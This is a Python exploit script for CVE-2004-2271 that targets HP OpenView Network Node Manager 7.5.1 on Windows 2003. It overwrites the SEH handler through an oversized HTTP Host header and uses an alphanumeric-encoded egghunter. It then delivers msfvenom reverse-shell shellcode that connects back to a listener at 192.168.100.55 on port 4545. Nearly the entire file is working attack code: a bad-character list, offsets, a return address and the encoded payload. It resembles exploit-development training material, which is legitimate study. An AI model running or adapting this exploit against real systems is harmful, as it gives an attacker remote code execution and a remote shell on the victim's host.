#!/usr/bin/python

# CVE: CVE-2004-2271 (https://nvd.nist.gov/vuln/detail/CVE-2004-2271/)
# Method: SEH override with egghunter
# Author: werebug (https://werebug.com)
# Tested on: Windows 2003 SP 1
# Software: OpenView Network Node Manager 7.5.1

import socket
import os
import sys

target = "192.168.101.177"
port = 7510

# ALLOWED CHARACTERS
allowed = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13"
allowed += "\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24"
allowed += "\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36"
allowed += "\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
allowed += "\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
allowed += "\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
allowed += "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d"
allowed += "\x7e\x7f"

# SEH OFFSET AT 3381
# POP POP RET AT 5A44745F
crash = "A" * 3377
crash += "\x79\x10\x41\x41"
crash += "\x5F\x74\x44\x5A"
crash += "C" * 10
# Aligning ESP
crash += "\x25\x4A\x4D\x4E\x55"	## and eax,0x554e4d4a
crash += "\x25\x35\x32\x31\x2A"	## and eax,0x554e4d4a
crash += "\x54"					## push esp
crash += "\x58"					## pop eax
crash += "\x05\x55\x55\x55\x55" ## add eax,0x55555555
crash += "\x2D\x55\x37\x54\x55" ## sub eax,0x55543755
crash += "\x50"					## push eax
crash += "\x5C"					## pop esp
# Egghunter encoded using Slink.py
# [*] Encoding [e7ffe775]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x43\x64\x77\x64" ## add  eax, 0x64776443
crash += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
crash += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax
# [*] Encoding [afea75af]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x57\x43\x65\x57" ## add  eax, 0x57654357
crash += "\x05\x46\x33\x54\x46" ## add  eax, 0x46543346
crash += "\x05\x45\x32\x64\x45" ## add  eax, 0x45643245
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax
#[*] Encoding [fa8b4142]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x32\x31\x46\x75" ## add  eax, 0x75463132
crash += "\x05\x21\x22\x45\x64" ## add  eax, 0x64452221
crash += "\x05\x22\x21\x33\x54" ## add  eax, 0x54332122
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax
#[*] Encoding [4344b8ef]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x67\x64\x33\x32" ## add  eax, 0x32336467
crash += "\x05\x56\x54\x22\x22" ## add  eax, 0x22225456
crash += "\x05\x65\x33\x22\x22" ## add  eax, 0x22223365
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax
#[*] Encoding [745a053c]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x26\x03\x35\x32" ## add  eax, 0x32350326
crash += "\x05\x16\x02\x25\x42" ## add  eax, 0x42250216
crash += "\x50"                 ## push eax
#[*] Encoding [2ecd5802]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x01\x34\x67\x17" ## add  eax, 0x17673401
crash += "\x05\x01\x24\x66\x17" ## add  eax, 0x17662401
crash += "\x50"                 ## push eax
#[*] Encoding [6a52420f]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x17\x32\x32\x35" ## add  eax, 0x35323217
crash += "\x05\x16\x21\x31\x34" ## add  eax, 0x34312116
crash += "\x05\x15\x22\x22\x34" ## add  eax, 0x34222215
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax
#[*] Encoding [ffca8166]..
crash += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
crash += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
crash += "\x05\x33\x41\x65\x77" ## add  eax, 0x77654133
crash += "\x05\x33\x42\x54\x66" ## add  eax, 0x66544233
crash += "\x05\x33\x31\x44\x55" ## add  eax, 0x55443133
crash += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
crash += "\x50"                 ## push eax

crash += "A" * (4000 - len(crash))

for c in crash:
	if c not in allowed:
		print("Unallowed character found: " + str(hex(ord(c))))

buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
buffer += "User-Agent: Mozilla/4.0\r\n"
buffer += "Content-Length: 50000\r\n\r\n"
# egg
buffer += "\x44\x43\x42\x41\x44\x43\x42\x41"
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.55 LPORT=4545 EXITFUNC=seh -f python
buffer += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buffer += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buffer += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buffer += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buffer += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buffer += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buffer += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buffer += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buffer += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buffer += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buffer += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buffer += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buffer += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buffer += "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buffer += "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x64\x37\x68"
buffer += "\x02\x00\x11\xc1\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buffer += "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buffer += "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buffer += "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buffer += "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buffer += "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buffer += "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buffer += "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xfe\x0e\x32\xea\x68"
buffer += "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buffer += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

print("[*] Sending evil HTTP request to NNMz")
expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((target, port))
expl.send(buffer)
expl.close()
